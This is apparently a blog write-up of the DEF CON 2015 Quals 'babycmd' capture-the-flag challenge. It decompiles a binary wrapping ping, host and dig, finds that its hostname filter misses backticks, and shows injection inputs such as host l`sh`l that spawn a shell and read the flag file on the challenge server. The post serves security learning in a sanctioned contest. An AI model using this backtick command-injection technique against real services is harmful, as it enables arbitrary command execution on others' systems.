---
layout: post
title: "DefConCTF 2015 Quals - babycmd Writeup"
date: 2015-05-18 13:39:52 +0430
comments: true
categories: defconctf pwn shell bypass
---

**DefConCTF 2015 babycmd Writeup**  
**Point = 1**  
**Category = Pwnable**  

As you may now defconctf started 2 days ago, so we participated and you can check our solutions right here.

OK, So there was 4 problem categories: `Baby's first`,  `Pwning`, `Coding`, `Reverse` and `Misc`.

This is babycmd writeup as you can see below, 

--

There was a binary `babycmd_3ad28b10e8ab283d7df81795075f600b` by following properties:

```
$ file babycmd_3ad28b10e8ab283d7df81795075f600b
babycmd_3ad28b10e8ab283d7df81795075f600b: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
$ checksec.sh --file babycmd_3ad28b10e8ab283d7df81795075f600b 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   babycmd_3ad28b10e8ab283d7df81795075f600b
```

This is so much for 1 point task, but you know this is DEFCON.

<!--more-->

by running the binary, it was a wrapper providing 3 functionalites: `ping`, `host`, `dig`

```
$ ./babycmd_3ad28b10e8ab283d7df81795075f600b 

Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 0 received, 100 0x56191abe7100acket loss, time 2016ms          
                                                                                      
Commands: ping, dig, host, exit                                                       
: host hamidx9.ir
hamidx9.ir has address 104.28.29.35
hamidx9.ir has address 104.28.28.35
hamidx9.ir has IPv6 address 2400:cb00:2048:1::681c:1c23
Commands: ping, dig, host, exit
: 

```

as strace says, it seems it parses the input and filter it and then try to execute!

Basicly with `executing` word i always look for a filter bypass and execute arbitrary commands. but `0x56191abe7100acket` in the ping command got my attention.

It's time to open the binary in IDA:

1. 6 main functions:  
  `sub_F5C`: parse and execute dig  
  `sub_10BD`: parse and execute host  
  `sub_E35`: parse and execute ping  
  `sub_121E`: main()  
  `sub_D65`: parse the input  
  `sub_DCC`: filter the input  
    
2. `ping` does not seem to be vulnerable:
```
    if ( (unsigned int)sub_D65(a1, (__int64)&cp) )
    {
      if ( inet_aton(&cp, &v4) )
      {
        v1 = inet_ntoa(v4);
        __sprintf_chk(&command, 1LL, 384LL, "ping -c 3 -W 3 %s", v1);
        v2 = popen(&command, "r");
        if ( v2 )
        {
          while ( fgets(&s, 512, v2) )
            __printf_chk(1LL, &s);
          pclose(v2);
        }
```
the `v1`  param which passes to `sprintf` returning from `inet_ntoa` so it cannot be a arbitrary value.

3. let's look at host code:
```
__int64 __fastcall sub_10BD(__int64 a1)
{
  char *v1; // rax@6
  FILE *v2; // rbp@10
  struct in_addr v4; // [sp+0h] [bp-538h]@5
  char command; // [sp+10h] [bp-528h]@6
  char cp; // [sp+190h] [bp-3A8h]@3
  char s; // [sp+310h] [bp-228h]@12
  __int64 v8; // [sp+518h] [bp-20h]@1

  v8 = *MK_FP(__FS__, 40LL);
  if ( a1 )
  {
    if ( (unsigned int)sub_D65(a1, (__int64)&cp) )
    {
      if ( inet_aton(&cp, &v4) )
      {
        v1 = inet_ntoa(v4);
        __sprintf_chk(&command, 1LL, 384LL, "host %s", v1);
      }
      else
      {
        if ( !(unsigned int)sub_DCC((__int64)&cp) )
        {
          puts("Invalid hostname.");
          return *MK_FP(__FS__, 40LL) ^ v8;
        }
        __sprintf_chk(&command, 1LL, 384LL, "host \"%s\"", &cp);
      }
      v2 = popen(&command, "r");
      if ( v2 )
      {
        while ( fgets(&s, 512, v2) )
          __printf_chk(1LL, &s);
        pclose(v2);
      }
      else
      {
        puts("Command failed.");
      }
    }
    else
    {
      puts("Invalid Host or IP address sent to dig.");
    }
  }
  else
  {
    puts("No address specified.");
  }
  return *MK_FP(__FS__, 40LL) ^ v8;
}
```
As you can see, second `__sprintf_chk` may acts unexpectedly. but there could be problem in using `sub_DCC`.

4. `sub_DCC` code:
```
signed __int64 __fastcall sub_DCC(__int64 a1)
{
  __int64 v1; // rsi@1
  signed __int64 v2; // rcx@1
  bool v3; // zf@3
  signed __int64 v4; // rcx@4
  signed __int64 result; // rax@4
  char v6; // dl@7

  v1 = a1;
  v2 = -1LL;
  do
  {
    if ( !v2 )
      break;
    v3 = *(_BYTE *)a1++ == 0;
    --v2;
  }
  while ( !v3 );
  v4 = ~v2;
  result = 0LL;
  if ( (unsigned __int64)(v4 - 4) <= 0x3C )
  {
    if ( (unsigned __int8)((*(_BYTE *)v1 & 0xDF) - 0x41) <= 0x19u
      || (result = 0LL, (unsigned __int8)(*(_BYTE *)v1 - 48) <= 9u) )
    {
      v6 = *(_BYTE *)(v1 + v4 - 1 - 1);
      result = 1LL;
      if ( (unsigned __int8)((v6 & 0xDF) - 0x41) > 0x19u )
        result = (unsigned __int8)(v6 - 0x30) <= 9u;
    }
  }
  return result;
}
```

i just noticed that it filters some bytes but not chr(0x60) which can be used to execute command and tried some tests on input.

finally i could run command like this: 

```
$ ./babycmd_3ad28b10e8ab283d7df81795075f600b 

Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: host l`ls`l
host: 'lbabycmd_3ad28b10e8ab283d7df81795075f600b
babycmd_3ad28b10e8ab283d7df81795075f600b.id0
babycmd_3ad28b10e8ab283d7df81795075f600b.id1
babycmd_3ad28b10e8ab283d7df81795075f600b.id2
babycmd_3ad28b10e8ab283d7df81795075f600b.nam
babycmd_3ad28b10e8ab283d7df81795075f600b.til
logl' is not a legal name (label too long)
Commands: ping, dig, host, exit
: 

```
but trying something like this ```host l`ls /home/`l``` can be seen below:
```
Commands: ping, dig, host, exit
: host l`ls /home/`l
sh: 1: ls/home/: not found
Host ll not found: 3(NXDOMAIN)
Commands: ping, dig, host, exit
: 
```

it filters space, so i can't run any command. 
but instead of reversing the filter function, i can use `sh`, aren't i :)) ?

So here's my points:

1. enter ``host l`sh`l`` as command
2. enter:  
  `cat /home/babycmd/flag`
3. Press Ctrl+D
4. Press Ctrl+C

So here we go:

```
$ nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491
Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: host l`sh`l
cat /home/babycmd/flag [Enter] [Ctrl+D]
: host: 'lThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??1' is not in legal name syntax (label too long)
Commands: ping, dig, host, exit
: ^C
```

So we have first 1 point at DEFCONCTF.

@HAMIDx9
